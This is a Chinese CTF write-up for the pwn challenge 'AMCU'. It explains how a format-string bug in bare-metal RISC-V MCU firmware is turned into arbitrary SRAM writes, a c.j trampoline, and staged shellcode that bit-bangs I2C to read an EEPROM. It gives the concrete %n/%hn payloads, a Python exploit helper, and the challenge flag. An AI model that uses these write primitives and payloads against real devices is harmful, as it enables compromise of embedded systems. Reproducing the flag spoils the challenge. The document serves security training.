# AMCU

## 题目简述

题目给出 MCU 固件和原理图，需要从固件字符串、I2C/串口交互和服务端 PoW/token 流程中恢复可利用输入，最终在嵌入式环境中拿到 flag。

## 解题过程

这题的核心是利用裸机固件里的格式化字符串能力，把输入从普通串口交互扩展成 SRAM 写入和跳转执行。可以从固定于 `_ebss` 的 `s0` 伪参数与 bootstrap 中的 `s1 = gp - *s0` 关系构造 `%n` 任意写；实践中也可以通过 63 字节输入让栈上的 printf 伪参数稳定落到 `0x20000000`，再把 `__WFE` 位置改成 `c.j` 跳板。

两条路径后续一致：先放一阶段 loader，再写入二阶段 exploit，最终执行 I2C shellcode 读取 EEPROM。

附件只有 firmware.bin 和原理图，没有平台明示地址。先从固件字符串和异或编码数据里还原出远端地址为 `<题目环境地址>`，服务需要队伍 token 和 sha256 PoW。

程序是 RV32E/RVC 裸机固件。主循环每次读最多 `0x40` 字节到 `0x200000e8` 附近，然后把输入直接交给自实现 printf。格式化函数支持 `%n/%hn/%hhn`，验证 `%x%n` 会触发 HardFault，HardFault 会 dump `0x20000000..0x20000800` 的 RAM。

HardFault 这条路能确认栈、`gp=0x20000860`、输入缓冲区和远端地址，但 flag 在交互前不在 RAM 里，不能只靠异常 dump 直接拿 flag。

退出路径有关键后门：输入 `exit` 后打印 `see ya`，执行 `fence.i`，随后 `jalr` 到 `0x20000000`。所以利用思路是先用格式化字符串的 `%hn` 把 RAM 起始半字 `0x20000000` 改成 RVC 跳转指令，再走 `exit` 触发 RAM shellcode。

最终第一阶段 payload 为：

- 用 `%{0xa061-12}x%x%x%x%x%x%hn` 写入 `0xa061`，这是从 `RAM[0]` 跳到输入缓冲中 stage1 的 `c.j`。
- 末尾填空格，使第 7 个格式化参数稳定为 `0x20000000`。
- stage1 位于输入缓冲内，调用固件读函数 `0x4d4` 从串口读 `0x40` 字节到 `0x20000128` 并跳过去。

第二阶段是 34 字节 loader。它循环调用固件读函数 `0x4d4`，逐字节把后续大 payload 写入 `0x20000180`，直到遇到哨兵字节 `0x0b` 后跳转执行。最终 C stage 必须链接到 `0x20000180`，不能直接截取未链接 `.o`，否则分支和调用重定位不正确。

原理图确认 AT24C64 的 A0/A1/A2 接地，所以 I2C 地址是 `0xa0/0xa1`。一开始按 PC0/PC1 和 `0x40011400` 读 EEPROM 只能得到全 `0xff`。重新看 KiCad/PDF 后确认实际连线是 `SDA=PC1`、`SCL=PC2`，并且 CH32/STM32F1 风格映射里 GPIOC 基址是 `0x40011000`，`0x40011400` 是 GPIOD；最终 stage 显式置 `RCC_APB2PCENR|=0x10` 开 GPIOC 时钟，再 bitbang I2C。

最终远端验证输出：

```text
A:10000000
D:ACTF{f423f891dc9d7a137f27e366fbff7974}
```

`A:10000000` 表示 `0xa0` ACK，随后 AT24C64 起始内容直接是 flag。核心 exploit 不需要在 WP 里展开整段机器码，保留关键写入原语和阶段边界即可。

```python
RAM_BASE = 0x20000000
RAM_END  = 0x20000800
GP       = 0x20000860

def construct_cj(off):
    assert off % 2 == 0
    assert -2048 <= off <= 2046
    inst = (0b101 << 13) | 0b01
    inst |= ((off >> 11) & 1) << 12
    inst |= ((off >> 4)  & 1) << 11
    inst |= ((off >> 8)  & 3) << 9
    inst |= ((off >> 10) & 1) << 8
    inst |= ((off >> 6)  & 1) << 7
    inst |= ((off >> 7)  & 1) << 6
    inst |= ((off >> 1)  & 7) << 3
    inst |= ((off >> 5)  & 1) << 2
    return inst

def prep_s0(io, target_addr):
    pad = GP - target_addr
    payload = f'%.0s%.0s%.0s%.0s%.0s%.0s%{pad}c%n\n%n%n'
    io.sendline(payload.encode())

def write_byte(io, target_addr, value):
    prep_s0(io, target_addr)
    pad = value or 256
    payload = f'%.0s%.0s%.0s%.0s%.0s%.0s%.0s%{pad}c%hhn'
    io.sendline(payload.encode())

def write_payload(io, target_addr, payload):
    for off, value in enumerate(payload):
        write_byte(io, target_addr + off, value)

def write_jmp(io, target_addr, write_addr=RAM_BASE + 2):
    cj = construct_cj(target_addr - write_addr)
    prep_s0(io, write_addr)
    io.sendline(f'%.0s%.0s%.0s%.0s%.0s%.0s%.0s%{cj & 0xffff}c%hn'.encode())
    io.sendline(b'exit')
```

也就是：先通过 PoW 和队伍 token 进入串口；用 `%n` 把伪参数 `s0` 指向目标 SRAM 地址；逐字节写入位置无关的 `read_i2c.S` payload；最后把 `RAM_BASE+2` 写成跳到 payload 的 `c.j`，发送 `exit` 触发 `fence.i` 和 `jalr 0x20000000`。

最终运行脚本打印出 flag，说明模拟器交互和 payload 构造正确。

### 验证

最终得到：

```text
ACTF{f423f891dc9d7a137f27e366fbff7974}
```

## 方法总结

- 核心技巧：把固件逆向、原理图外设信息和远程包装协议合在一起恢复利用路径。
- 识别信号：Pwn 题只给 firmware + schematic 时，应先确认 MCU 架构、外设寄存器和远端服务如何喂输入。
- 复用要点：WP 要保留平台识别、外设作用和最终 payload 触发条件，不能只写远程脚本。
